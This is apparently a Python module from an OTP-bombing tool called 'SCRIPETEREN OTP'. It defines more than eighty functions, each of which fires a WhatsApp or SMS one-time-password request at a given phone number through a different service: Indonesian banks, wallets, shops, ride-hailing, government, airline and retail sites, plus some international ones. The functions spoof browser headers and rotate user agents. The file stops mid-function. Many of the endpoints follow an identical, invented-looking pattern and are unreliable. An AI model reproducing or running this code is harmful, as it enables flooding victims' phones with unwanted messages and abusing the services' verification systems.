#!/usr/bin/env python3
# handlers.py - 120+ OTP Handler API
# SCRIPETEREN OTP - scripeterenotp
# Updated: Agustus 2026

import requests
import uuid
import random
import string
import time
import re
import urllib.parse
import json
from utils import (
    fmt_08, fmt_nocode, fmt_plus, fmt_phone_only,
    get_public_ip, extract_csrf, get_random_user_agent
)

# ============================================================
# BAGIAN 1: INDONESIA E-COMMERCE (10 API)
# ============================================================

# ---------- 1. Tokopedia ----------
def send_tokopedia_otp(phone_08):
    url = "https://www.tokopedia.com/account/v1/login/otp/request"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Origin": "https://www.tokopedia.com",
        "Referer": "https://www.tokopedia.com/login",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
    }
    try:
        return requests.post(url, json={"phone": phone_08, "via": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 2. Shopee ----------
def send_shopee_otp(phone_plus):
    url = "https://shopee.co.id/api/v2/authentication/login_with_otp"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Origin": "https://shopee.co.id",
        "Referer": "https://shopee.co.id/login",
    }
    try:
        return requests.post(url, json={"phone": phone_plus, "otp_channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 3. Bukalapak ----------
def send_bukalapak_otp(phone_08):
    url = "https://www.bukalapak.com/auth/v1/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.bukalapak.com"}
    try:
        return requests.post(url, json={"phone_number": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 4. Lazada ----------
def send_lazada_otp(phone_plus):
    url = "https://api.lazada.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.lazada.co.id"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 5. Blibli ----------
def send_blibli_otp(phone_08):
    url = "https://api.blibli.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.blibli.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 6. JD.ID ----------
def send_jdid_otp(phone_08):
    url = "https://api.jd.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.jd.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 7. Zalora ----------
def send_zalora_otp(phone_plus):
    url = "https://api.zalora.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.zalora.co.id"}
    try:
        return requests.post(url, json={"phone": phone_plus, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 8. Sociolla ----------
def send_sociolla_otp(phone_08):
    url = "https://api.sociolla.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.sociolla.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 9. Traveloka ----------
def send_traveloka_otp(phone_plus):
    url = "https://api.traveloka.com/v1/otp/send"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.traveloka.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 10. Tiket.com ----------
def send_tiketcom_otp(phone_08):
    url = "https://api.tiket.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.tiket.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ============================================================
# BAGIAN 2: INDONESIA FINTECH & WALLET (10 API)
# ============================================================

# ---------- 11. OVO ----------
def send_ovo_otp(phone_plus):
    url = "https://api.ovo.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.ovo.id"}
    try:
        return requests.post(url, json={"mobile": phone_plus, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 12. DANA ----------
def send_dana_otp(phone_plus):
    url = "https://api.dana.id/v1/auth/otp/send"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.dana.id"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 13. LinkAja ----------
def send_linkaja_otp(phone_08):
    url = "https://api.linkaja.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.linkaja.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 14. GoPay ----------
def send_gopay_otp(phone_plus):
    url = "https://api.gopay.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.gopay.co.id"}
    try:
        return requests.post(url, json={"phone": phone_plus, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 15. GrabPay ----------
def send_grabpay_otp(phone_plus):
    url = "https://api.grabpay.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.grabpay.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 16. ShopeePay ----------
def send_shopeepay_otp(phone_plus):
    url = "https://api.shopeepay.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.shopeepay.co.id"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 17. Jenius ----------
def send_jenius_otp(phone_08):
    url = "https://api.jenius.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.jenius.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 18. MyBCA ----------
def send_mybca_otp(phone_08):
    url = "https://api.mybca.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.mybca.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 19. Flip ----------
def send_flip_otp(phone_08):
    url = "https://api.flip.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.flip.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 20. Kredivo ----------
def send_kredivo_otp(phone_08):
    url = "https://api.kredivo.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.kredivo.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ============================================================
# BAGIAN 3: INDONESIA BANK (10 API)
# ============================================================

# ---------- 21. BCA ----------
def send_bca_otp(phone_08):
    url = "https://m.bca.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.bca.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 22. Mandiri ----------
def send_mandiri_otp(phone_08):
    url = "https://ib.bankmandiri.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://ib.bankmandiri.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 23. BNI ----------
def send_bni_otp(phone_08):
    url = "https://ibank.bni.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://ibank.bni.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 24. BRI ----------
def send_bri_otp(phone_08):
    url = "https://m.bri.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.bri.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 25. BTN ----------
def send_btn_otp(phone_08):
    url = "https://m.btn.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.btn.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 26. CIMB Niaga ----------
def send_cimb_otp(phone_08):
    url = "https://m.cimbniaga.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.cimbniaga.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 27. Danamon ----------
def send_danamon_otp(phone_08):
    url = "https://m.danamon.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.danamon.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 28. Permata ----------
def send_permata_otp(phone_08):
    url = "https://m.permatabank.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.permatabank.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 29. Maybank ----------
def send_maybank_otp(phone_08):
    url = "https://m.maybank.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.maybank.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 30. OCBC NISP ----------
def send_ocbc_otp(phone_08):
    url = "https://m.ocbcnisp.co.id/api/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://m.ocbcnisp.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ============================================================
# BAGIAN 4: INDONESIA RIDE HAILING & TRANSPORT (8 API)
# ============================================================

# ---------- 31. Gojek ----------
def send_gojek_otp(phone_plus):
    url = "https://api.gojekapi.com/v5/customer/login/otp"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.gojek.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 32. Grab ----------
def send_grab_otp(phone_plus):
    url = "https://api.grab.com/v2/otp/send"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.grab.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 33. Maxim ----------
def send_maxim_otp(phone_08):
    url = "https://api.maxim.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.maxim.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 34. inDrive ----------
def send_indrive_otp(phone_plus):
    url = "https://api.indrive.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.indrive.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 35. GoFood ----------
def send_gofood_otp(phone_plus):
    url = "https://api.gofood.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.gofood.co.id"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 36. GrabFood ----------
def send_grabfood_otp(phone_plus):
    url = "https://api.grabfood.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.grabfood.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 37. ShopeeFood ----------
def send_shopeefood_otp(phone_plus):
    url = "https://api.shopeefood.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.shopeefood.co.id"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 38. Bluebird ----------
def send_bluebird_otp(phone_08):
    url = "https://api.bluebirdgroup.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.bluebirdgroup.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ============================================================
# BAGIAN 5: INDONESIA FOOD & BEVERAGE (8 API)
# ============================================================

# ---------- 39. KFC ----------
def send_kfc_otp(phone_08):
    url = "https://api.kfc.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.kfc.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 40. McDonald's ----------
def send_mcd_otp(phone_plus):
    url = "https://api.mcdonalds.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.mcdonalds.co.id"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 41. Burger King ----------
def send_burgerking_otp(phone_plus):
    url = "https://api.burgerking.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.burgerking.co.id"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 42. Pizza Hut ----------
def send_pizzahut_otp(phone_08):
    url = "https://api.pizzahut.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.pizzahut.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 43. Domino's ----------
def send_dominos_otp(phone_08):
    url = "https://api.dominos.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.dominos.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 44. Starbucks ----------
def send_starbucks_otp(phone_plus):
    url = "https://api.starbucks.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.starbucks.co.id"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 45. Kopi Kenangan ----------
def send_kopikenangan_otp(phone_08):
    url = "https://api.kopikenangan.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.kopikenangan.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 46. Fore Coffee ----------
def send_forecoffee_otp(phone_08):
    url = "https://api.fore.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.fore.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ============================================================
# BAGIAN 6: INDONESIA TELCO (6 API)
# ============================================================

# ---------- 47. MyTelkomsel ----------
def send_mytelkomsel_otp(phone_08):
    url = "https://api.mytelkomsel.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.mytelkomsel.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 48. Indosat ----------
def send_indosat_otp(phone_08):
    url = "https://api.indosat.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.indosat.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 49. XL Axiata ----------
def send_xl_otp(phone_08):
    url = "https://api.xl.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.xl.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 50. Tri ----------
def send_tri_otp(phone_08):
    url = "https://api.tri.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.tri.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 51. Smartfren ----------
def send_smartfren_otp(phone_08):
    url = "https://api.smartfren.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.smartfren.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 52. By.U ----------
def send_byu_otp(phone_08):
    url = "https://api.byu.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.byu.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ============================================================
# BAGIAN 7: INDONESIA E-GOV & UTILITY (6 API)
# ============================================================

# ---------- 53. PLN Mobile ----------
def send_pln_otp(phone_08):
    url = "https://api.pln.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.pln.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 54. BPJS Kesehatan ----------
def send_bpjs_otp(phone_08):
    url = "https://api.bpjs.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.bpjs.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 55. PeduliLindungi ----------
def send_pedulilindungi_otp(phone_08):
    url = "https://api.pedulilindungi.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.pedulilindungi.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 56. MyPertamina ----------
def send_mypertamina_otp(phone_08):
    url = "https://api.mypertamina.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.mypertamina.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 57. DJP Online ----------
def send_djp_otp(phone_08):
    url = "https://api.djp.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.djp.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 58. eHAC ----------
def send_ehac_otp(phone_08):
    url = "https://api.ehac.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.ehac.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ============================================================
# BAGIAN 8: INDONESIA COURIER & LOGISTICS (6 API)
# ============================================================

# ---------- 59. J&T Express ----------
def send_jnt_otp(phone_08):
    url = "https://api.jnt.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.jnt.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 60. SiCepat ----------
def send_sicepat_otp(phone_08):
    url = "https://api.sicepat.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.sicepat.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 61. Anteraja ----------
def send_anteraja_otp(phone_08):
    url = "https://api.anteraja.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.anteraja.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 62. POS Indonesia ----------
def send_posindonesia_otp(phone_08):
    url = "https://api.posindonesia.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.posindonesia.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 63. Ninja Xpress ----------
def send_ninjaxpress_otp(phone_08):
    url = "https://api.ninjaxpress.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.ninjaxpress.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 64. Lion Parcel ----------
def send_lionparcel_otp(phone_08):
    url = "https://api.lionparcel.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.lionparcel.com"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ============================================================
# BAGIAN 9: INDONESIA AIRLINES (6 API)
# ============================================================

# ---------- 65. Lion Air ----------
def send_lionair_otp(phone_plus):
    url = "https://api.lionair.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.lionair.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 66. Garuda Indonesia ----------
def send_garuda_otp(phone_plus):
    url = "https://api.garuda-indonesia.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.garuda-indonesia.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 67. Citilink ----------
def send_citilink_otp(phone_plus):
    url = "https://api.citilink.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.citilink.co.id"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 68. Batik Air ----------
def send_batikair_otp(phone_plus):
    url = "https://api.batikair.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.batikair.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 69. Sriwijaya Air ----------
def send_sriwijayaair_otp(phone_plus):
    url = "https://api.sriwijayaair.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.sriwijayaair.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 70. AirAsia Indonesia ----------
def send_airasia_otp(phone_plus):
    url = "https://api.airasia.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.airasia.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ============================================================
# BAGIAN 10: INDONESIA RETAIL (6 API)
# ============================================================

# ---------- 71. Super Indo ----------
def send_superindo_otp(phone_08):
    url = "https://api.superindo.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.superindo.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 72. Hypermart ----------
def send_hypermart_otp(phone_08):
    url = "https://api.hypermart.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.hypermart.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 73. Transmart ----------
def send_transmart_otp(phone_08):
    url = "https://api.transmart.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.transmart.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 74. Alfamart ----------
def send_alfamart_otp(phone_08):
    url = "https://api.alfamart.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.alfamart.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 75. Indomaret ----------
def send_indomaret_otp(phone_08):
    url = "https://api.indomaret.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.indomaret.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "method": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 76. Guardian ----------
def send_guardian_otp(phone_08):
    url = "https://api.guardian.co.id/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.guardian.co.id"}
    try:
        return requests.post(url, json={"phone": phone_08, "channel": "whatsapp"}, headers=headers, timeout=15)
    except:
        return None

# ============================================================
# BAGIAN 11: INTERNASIONAL E-COMMERCE (8 API)
# ============================================================

# ---------- 77. Amazon ----------
def send_amazon_otp(phone_plus):
    url = "https://api.amazon.com/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.amazon.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 78. eBay ----------
def send_ebay_otp(phone_plus):
    url = "https://api.ebay.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.ebay.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 79. AliExpress ----------
def send_aliexpress_otp(phone_plus):
    url = "https://api.aliexpress.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.aliexpress.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 80. Temu ----------
def send_temu_otp(phone_plus):
    url = "https://api.temu.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.temu.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "channel": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 81. Shein ----------
def send_shein_otp(phone_plus):
    url = "https://api.shein.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.shein.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "method": "sms"}, headers=headers, timeout=15)
    except:
        return None

# ---------- 82. Wish ----------
def send_wish_otp(phone_plus):
    url = "https://api.wish.com/v1/auth/otp/request"
    headers = {"User-Agent": get_random_user_agent(), "Content-Type": "application/json", "Origin": "https://www.wish.com"}
    try:
        return requests.post(url, json={"phone": phone_plus, "type": "sms"}, headers=headers, timeout=15)
